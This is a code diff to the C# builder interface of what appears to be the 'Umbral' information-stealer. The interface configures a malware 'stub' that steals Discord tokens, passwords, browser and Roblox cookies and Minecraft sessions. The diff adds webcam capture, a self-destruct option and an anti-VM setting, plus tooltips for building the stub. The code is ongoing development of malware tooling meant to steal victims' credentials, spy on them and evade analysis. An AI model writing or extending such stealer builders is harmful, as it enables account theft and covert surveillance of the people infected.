@@ -1,5 +1,4 @@
-﻿using System.Drawing;
-using System.Windows.Forms;
+﻿using System.Windows.Forms;
 using Umbral.builder.Build;
 
 namespace Umbral.builder.User_Controls
@@ -18,6 +17,10 @@ namespace Umbral.builder.User_Controls
         public BuilderTab()
         {
             InitializeComponent();
+            ToolTip tooltip = new ToolTip();
+
+            tooltip.SetToolTip(IconSelectButton, "Select icon for the stub.");
+            tooltip.SetToolTip(BuildButton, "Build the stub.");
         }
 
         private void BuildButton_Click(object sender, System.EventArgs e)
@@ -26,7 +29,7 @@ namespace Umbral.builder.User_Controls
             if (buildButton.Text.Equals(BuildButtonEnabledPlaceHolder))
             {
                 if (!(GeneralTab.StealTokens || GeneralTab.StealRobloxCookies || GeneralTab.StealCookies ||
-                      GeneralTab.StealPasswords || GeneralTab.StealMinecraftSession || GeneralTab.TakeScreenshot))
+                      GeneralTab.StealPasswords || GeneralTab.StealMinecraftSession || GeneralTab.TakeScreenshot || GeneralTab.CaptureWebcam))
                 {
                     MessageBox.Show("Enable at least one of the stealing targets!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     return;
@@ -55,13 +58,15 @@ namespace Umbral.builder.User_Controls
 
                         Ping = GeneralTab.Ping,
                         Startup = GeneralTab.Startup,
-                        VmProtect = GeneralTab.VmProtect,
+                        AntiVm = GeneralTab.AntiVm,
                         StealTokens = GeneralTab.StealTokens,
                         StealPasswords = GeneralTab.StealPasswords,
                         StealCookies = GeneralTab.StealCookies,
                         StealRobloxCookies = GeneralTab.StealRobloxCookies,
                         StealMinecraftSession = GeneralTab.StealMinecraftSession,
                         CaptureScreenshot = GeneralTab.TakeScreenshot,
+                        SelfDestruct = GeneralTab.SelfDestruct,
+                        CaptureWebcam = GeneralTab.CaptureWebcam,
 
                         AssemblyInformation = new AssemblyInfo
                         {
